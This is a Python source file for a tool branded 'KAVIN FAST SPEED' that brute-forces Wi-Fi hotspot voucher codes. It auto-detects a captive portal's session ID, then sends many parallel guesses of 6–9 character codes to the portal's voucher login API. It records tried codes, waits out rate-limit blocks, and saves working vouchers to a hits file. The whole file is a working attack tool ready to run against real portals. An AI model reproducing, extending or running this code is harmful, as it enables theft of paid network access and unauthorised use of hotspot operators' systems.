# lakaw.py (KAVIN FAST SPEED - Clean & Simple)
import os
import time
import json
import random
import string
import sqlite3
import re
import html
import requests
import urllib3
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
import license as _license

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "lakaw_data.db"
STATE_FILE = "lakaw_state.json"
HITS_FILE = "hits.txt"

# ⚡ Speed Settings
MAX_WORKERS = 5
BASE_SLEEP_MIN = 0.01
BASE_SLEEP_MAX = 0.03
RATE_LIMIT_SLEEP = 45
NETWORK_RETRY_SLEEP = 0.5
SESSION_REFRESH_SLEEP = 1.0

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36"})
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
session.mount('http://', adapter)
session.mount('https://', adapter)

def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"

def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception: return None

def is_tried(conn, code):
    if conn is None: return False
    try: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits, custom_url="", scan_method="random"):
    try:
        with open(STATE_FILE, "w") as f: json.dump({"mode": mode, "tested": tested, "hits": hits, "custom_url": custom_url, "scan_method": scan_method}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception: return None

def fetch_session(custom_url=""):
    if custom_url:
        try:
            r = session.get(custom_url, timeout=3, allow_redirects=True, verify=False)
            p = urlparse(r.url)
            portal_base = f"{p.scheme}://{p.netloc}"
            sid = extract_session(r.url) or extract_session(r.text)
            if sid: return portal_base, sid
            return portal_base, "auto_session"
        except Exception: pass

    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=2, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            for c in cands:
                sid = extract_session(c)
                if sid: return portal_base, sid
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=2, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return portal_base, sid
            except Exception: pass
        except Exception: continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=1.5, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception: return "__NETWORK_ERROR__"

def gen_code(mode, length):
    try:
        if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
        elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""

# 🎨 Clean & Simple Dashboard
def render_dashboard(mode, current_code, tested, elapsed, status, hits, logs, speed):
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

    status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "bright_yellow")

    console.print(Text.assemble(
        ("  🎯 Code   : ", "bright_white"), (f"{current_code}\n", "bold bright_green"),
        ("  📊 Tested : ", "bright_white"), (f"{tested:,}\n", "bold bright_yellow"),
        ("  ⚡ Speed  : ", "bright_white"), (f"{speed:.1f} c/m\n", "bold bright_cyan"),
        ("  ⏱ Time   : ", "bright_white"), (f"{elapsed}\n", "bold bright_blue"),
        ("  📡 Status : ", "bright_white"), (f"{status.upper()}\n", f"bold {status_color}"),
        ("  🏆 Hits   : ", "bright_white"), (f"{len(hits)}\n", "bold bright_magenta"),
    ))

    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
    console.print(Text("  📜 Recent Logs", style="bold bright_yellow"))
    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
    
    for lg in logs[-4:]:
        console.print(Text.from_markup(f"  {lg}"))
    if not logs:
        console.print(Text("  Waiting...", style="dim"))

    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
    console.print(Text("  💎 Valid Codes Found", style="bold bright_yellow"))
    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))

    last_hits = hits[-3:]
    if last_hits:
        for i, h in enumerate(last_hits, 1):
            c = h.get("code", "") if isinstance(h, dict) else h
            t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
            console.print(Text.assemble(
                (f"  {i}. ", "dim white"),
                (f"{c}", "bold bright_green"),
                (f"   [{t}]", "dim bright_cyan")
            ))
    else:
        console.print(Text("  Searching...", style="dim"))
    console.print()

def scan_loop(mode, length, custom_url="", scan_method="random", start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    hits = normalize_hits(start_hits) if start_hits else []
    running_logs, tested = [], start_tested
    start_time, portal_base, session_id, net_error_streak = time.time(), None, None, 0
    conn = init_db()
    current_code = [""]
    last_time, speed_counter, current_speed = time.time(), 0, 0.0

    def push_log(msg): running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")
    def update_ui(status):
        render_dashboard(mode_str, current_code[0], tested, format_time(time.time() - start_time), status, hits, running_logs, current_speed)

    try:
        push_log("[bright_cyan]Engine Started...[/bright_cyan]")
        while True:
            try:
                if not session_id or not portal_base:
                    update_ui("Init")
                    portal_base, session_id = fetch_session(custom_url)
                    if not session_id:
                        time.sleep(SESSION_REFRESH_SLEEP)
                        portal_base = custom_url or "http://portal.local"
                        session_id = "auto_session"
                    net_error_streak = 0

                batch_codes = []
                while len(batch_codes) < MAX_WORKERS * 2:
                    c = gen_code(mode, length)
                    if c and not is_tried(conn, c):
                        mark_tried(conn, c)
                        batch_codes.append(c)

                if not batch_codes: continue
                success_hit = False

                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                    futures = {executor.submit(test_code, portal_base, session_id, code): code for code in batch_codes}

                    for future in as_completed(futures):
                        code = futures[future]
                        tested += 1
                        current_code[0] = code
                        try:
                            res = future.result()
                        except Exception:
                            continue

                        low = (res or "").lower()
                        elapsed_total = time.time() - start_time
                        current_speed = (tested / elapsed_total * 60) if elapsed_total > 0 else 0.0

                        push_log(f"Testing: [yellow]{code}[/yellow]")
                        update_ui("Active")

                        if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
                            update_ui("Limit")
                            push_log(f"[bold red]🛡️ Block Detected! Sleeping...[/bold red]")
                            time.sleep(RATE_LIMIT_SLEEP)
                            session_id = None
                            success_hit = True
                            break

                        if "session timed out" in low or "session timeout" in low or '"session":null' in low:
                            session_id = None
                            break

                        if '"success":true' in low or '"authresult":"1"' in low:
                            existing = hits_codes_only(hits)
                            if code not in existing:
                                now_str = time.strftime("%H:%M:%S")
                                hits.append({"code": code, "time": now_str})
                                push_log(f"[bold bright_green]✨ VOUCHER FOUND: {code}[/bold bright_green]")
                                try:
                                    with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
                                except Exception: pass
                                save_state(mode_str, tested, hits, custom_url, scan_method)
                            update_ui("Active")
                            success_hit = True
                            break

                save_state(mode_str, tested, hits, custom_url, scan_method)
                if success_hit: time.sleep(0.1)

            except KeyboardInterrupt: raise
            except Exception:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
    except KeyboardInterrupt:
        pass
def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit")
        console.print()
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()

        if choice == "0": return None
        if choice not in ("1", "2", "3"):
            console.print("  [bold red]Invalid![/bold red]")
            time.sleep(1)
            continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print(f"  Mode: [bold yellow]{mode.upper()}[/bold yellow]\n")
        for i in range(6, 10):
            console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] ⚡ {i} Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅ Back")
        console.print()
        length = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()

        if length == "0": return None
        if length not in ("6", "7", "8", "9"):
            console.print("  [bold red]Invalid![/bold red]")
            time.sleep(1)
            continue
        return int(length)

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅  Back")
        console.print()
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()

        if choice == "0": return None
        if choice not in ("1", "2"):
            console.print("  [bold red]Invalid![/bold red]")
            time.sleep(1)
            continue
        return {"1": "random", "2": "sequential"}[choice]

def ask_url_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 📝  Manual URL (Enter IP)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔄  Auto Detect URL")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅  Back")
        console.print()
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()

        if choice == "0": return None
        if choice == "1":
            url = Prompt.ask("  [bright_cyan]➜ IP[/bright_cyan]").strip()
            return (url, "manual")
        if choice == "2":
            return ("", "auto")
        console.print("  [bold red]Invalid![/bold red]")
        time.sleep(1)

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            custom_url = state.get("custom_url", "")
            scan_method = state.get("scan_method", "random")

            show_banner()
            console.print("  [bold yellow]💾 Previous Session Found[/bold yellow]\n")
            console.print(f"  Mode   : [bold white]{m.upper()} {l}[/bold white]")
            console.print(f"  Tested : [bold white]{tested:,}[/bold white]")
            console.print(f"  Hits   : [bold green]{len(hits)}[/bold green]\n")
            
            ans = Prompt.ask("  [bright_cyan]➜ Resume? (y/n)[/bright_cyan]").strip().lower()
            if ans in ("", "y", "yes"):
                scan_loop(m, int(l), custom_url, scan_method, start_tested=tested, start_hits=hits)
                return
            else: clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return

        length = ask_length(mode)
        if length is None: continue

        method = ask_scan_method()
        if method is None: continue

        url_choice = ask_url_method()
        if url_choice is None: continue
        custom_url, _ = url_choice

        scan_loop(mode, length, custom_url, method)
        return

def main():
    if not _license.check_approval(): return
    try: run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            console.print("\n\n")
            console.print(Text("🙏 ကျေးဇူးတင်ပါတယ်ဗျ။ ✨", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(2)
        except BaseException: pass

if __name__ == "__main__":
    main()